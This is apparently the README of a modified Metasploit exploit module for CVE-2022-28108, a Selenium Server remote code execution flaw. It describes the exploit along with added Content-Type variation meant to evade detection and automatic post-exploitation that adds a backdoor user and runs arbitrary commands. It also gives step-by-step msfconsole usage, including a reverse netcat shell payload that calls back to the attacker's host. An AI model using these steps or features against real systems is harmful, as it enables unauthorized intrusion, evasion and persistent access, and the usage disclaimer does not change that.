## Selenium Chrome RCE Exploit (Extended)

This repository contains a modified version of a Metasploit module that exploits a Remote Code Execution vulnerability in older versions of Selenium Server (Grid).

**Please read this README carefully before using this code.**

---

**Acknowledgment of Original Code:**

This module is based on the excellent work of the original authors of the Metasploit module for CVE-2022-28108. The core functionality of exploiting the Selenium Server vulnerability remains largely based on their implementation. We acknowledge and appreciate their contribution to the security community.

*   **Original Metasploit Module:**  You can find the original module within the Metasploit Framework.
*   **Original Authors:**  The original authors are credited within the module itself (typically in the `'Author'` section). Please refer to the original module for their specific names.

**Vulnerability Exploited:**

This module targets **CVE-2022-28108**, a Cross-Site Request Forgery (CSRF) vulnerability in Selenium Server (Grid) versions prior to 4.0.0-alpha-7. This vulnerability arises because the server permits non-JSON content types (like `text/plain`, `application/x-www-form-urlencoded`, and `multipart/form-data`) for certain requests. An attacker can leverage this to send malicious requests, leading to Remote Code Execution (RCE) on the server.

**How the Original Code Works:**

The original Metasploit module exploits this vulnerability by sending a crafted POST request to the `/wd/hub/session` endpoint of the vulnerable Selenium Server. This request utilizes a non-JSON `Content-Type` (specifically `text/plain`) and includes malicious configurations within the `goog:chromeOptions` of the desired browser capabilities. This allows an attacker to specify an arbitrary binary (like `/usr/bin/python3`) and arguments to be executed on the server when a new browser session is initiated.

**Modifications and Enhancements in This Version:**

This repository contains a modified version of the original Metasploit module. The key modifications include:

*   **Content-Type Evasion:** The modified module attempts to exploit the vulnerability by sending the malicious request with multiple different `Content-Type` headers. This includes `text/plain`, `application/x-www-form-urlencoded`, and `multipart/form-data`. This is done to potentially bypass basic filtering or detection mechanisms that might be looking for a specific `Content-Type`.
*   **`execute_post_exploitation` Function:** A new function `execute_post_exploitation(session_response)` has been added. This function is called after successful exploitation and aims to perform basic post-exploitation tasks. In the current implementation, it includes:
    *   Attempting to add a backdoor user to the system.
    *   Gathering basic system information (username, ID, kernel version).
*   **`execute_command_on_target` Function:** Another new function `execute_command_on_target(command)` has been added. This function allows for the execution of arbitrary commands on the target system after a successful exploit. It's used within the `execute_post_exploitation` function and can be extended for further post-exploitation activities.

**Key Differences Highlighted:**

The core difference lies in the `exploit` method and the addition of the two new functions.

*   **Original `exploit` Method:** Focused on sending a single request with `Content-Type: text/plain`.
*   **Modified `exploit` Method:** Iterates through different `Content-Type` values, attempting the exploit with each. Upon successful exploitation, it calls the `execute_post_exploitation` function.
*   **New Functions:** The `execute_post_exploitation` and `execute_command_on_target` functions are entirely new additions to this modified version, providing extended post-exploitation capabilities.

**How to Use the Modified Module:**

1. **Ensure you have Metasploit Framework installed.**
2. **Save the modified code:** Save the provided Ruby code as a `.rb` file (e.g., `selenium_rce_extended.rb`).
3. **Place the module in the Metasploit modules directory:** Copy the saved file to the appropriate Metasploit module directory. This is typically located at `/usr/share/metasploit-framework/modules/exploits/` or `~/.msf4/modules/exploits/`. Refer to your Metasploit installation for the exact location.
4. **Start Metasploit Console:** Open a terminal and run `msfconsole`.
5. **Load the module:** In the Metasploit console, use the command `use exploit/selenium_rce_extended` (or the path where you saved the file if you placed it in a subdirectory).
6. **Configure the target:** Set the target IP address and port of the vulnerable Selenium Server:
    ```
    msf6 exploit(selenium_rce_extended) > set RHOSTS <target_ip>
    msf6 exploit(selenium_rce_extended) > set RPORT <target_port>
    ```
    (The default port for Selenium Grid is often 4444).
7. **Set the payload:** Choose a payload to execute on the target system. For example, to get a reverse shell:
    ```
    msf6 exploit(selenium_rce_extended) > set PAYLOAD cmd/unix/reverse_netcat
    msf6 exploit(selenium_rce_extended) > set LHOST <your_ip>
    msf6 exploit(selenium_rce_extended) > set LPORT <your_port>
    ```
8. **Run the exploit:** Execute the module with the command `exploit`.

**Important Considerations (Disclaimer):**

*   **Use this code responsibly and ethically.** This module is provided for educational purposes and for security professionals to test and assess the security of their systems.
*   **Ensure you have explicit permission to test against the target system.** Unauthorized use of this code is illegal and unethical.
*   **Understand the risks involved.** Exploiting vulnerabilities can have unintended consequences and may destabilize target systems.
*   **Test in isolated and controlled environments.**  Always perform testing in environments where you have full control and can mitigate any potential damage.
*   **The post-exploitation functions are basic examples.** You may need to modify or extend them based on your specific needs and the target environment.

**Disclaimer of Liability:**

The author(s) of this modified code are not responsible for any misuse or damage caused by the use of this module. By using this code, you agree to take full responsibility for your actions.

**License:**

This modified code is likely covered under the same license as the original Metasploit Framework (typically the MSF License). Please refer to the original Metasploit Framework license for details.

**Contributing:**

Contributions and improvements to this module are welcome. Please feel free to submit pull requests with bug fixes, enhancements, or new features.

**Acknowledgments:**

We reiterate our gratitude to the original authors of the Metasploit module for CVE-2022-28108. Their work forms the foundation of this modified module.
